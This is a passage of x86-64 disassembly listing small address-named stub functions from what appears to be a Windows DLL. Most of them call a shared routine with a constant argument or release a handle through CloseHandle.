mov ecx 0xa
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015cd0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015cf0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xb
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015d09
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x7
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015d22
push rbp
sub rsp 0x40
mov rbp rdx
mov ecx 0x7
call sub_18000bb50
add rsp 0x40
pop rbp
retn
sub_180015d3b
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x6
call sub_18000bb50
add rsp 0x20
pop rbp
retn
sub_180015d60
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x20 ]
test rcx rcx
je r-xdata
add rsp 0x20
pop rbp
retn
call [ CloseHandle@IAT ]
sub_180015e70
push rbp
sub rsp 0x20
mov rbp rdx
lea rcx [ rbp + 0x48 ]
call sub_180003230
add rsp 0x20
pop rbp
retn
sub_180015ecc
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001468c
add rsp 0x20
pop rbp
retn
sub_180015eec
push rbp
sub rsp 0x20
mov rbp rdx
call sub_1800068b0
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_1800068b0
dec [ rax + 0x100 ]
sub_180015f14
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_1800160c0
lea rcx [ sub_1800160d0 ]
jmp sub_18000443c
sub_180016144
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_1800086c8
